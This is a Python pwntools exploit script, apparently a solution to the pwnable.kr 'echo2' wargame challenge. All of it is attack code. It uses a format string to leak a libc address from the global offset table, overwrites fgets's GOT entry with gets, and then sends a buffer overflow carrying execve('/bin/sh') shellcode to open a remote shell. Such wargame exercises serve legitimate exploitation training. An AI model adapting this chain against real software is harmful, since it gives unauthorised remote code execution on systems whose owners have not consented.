from pwn import *

def DEBUG():
	gdb.attach(r, '''
					b *0x0000000000400864
					c
				   ''')

def menu(op):
	r.recvuntil('>')
	r.sendline(str(op))
	r.recvuntil('\n')

elf  = ELF('./echo2')
libc = ELF('./libc.so.6')

r = remote('pwnable.kr', '9011')
#r = process('./echo2')

# leak printf_got
fgets_got = elf.symbols['got.fgets']
print(hex(fgets_got))
payload  = '%7$sAAAA' + p64(fgets_got)
print p64(fgets_got)
r.recvuntil(' : ')
r.sendline(asm("jmp rsp", arch='amd64', os='linux'))
menu(2)
r.sendline(payload)
fgets_addr = u64(r.recvuntil('AAAA')[:-4].ljust(8, '\x00'))
libc_base = fgets_addr - libc.symbols['fgets']
print(hex(fgets_addr))

# rewrite fgets_got to gets
fgets_got = elf.symbols['got.fgets']
gets_addr = libc_base + libc.symbols['gets']
print(hex(gets_addr))
#DEBUG()
payload  = '%{}c%{}$hn'.format(gets_addr&0xffff, 8).ljust(16, 'a')
payload += p64(fgets_got)
menu(2)
r.sendline(payload)


# back to echo1
buf = 0x6020a0
menu(2)
sh = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
r.sendline('a'*0x28 + p64(buf) + sh)
r.interactive()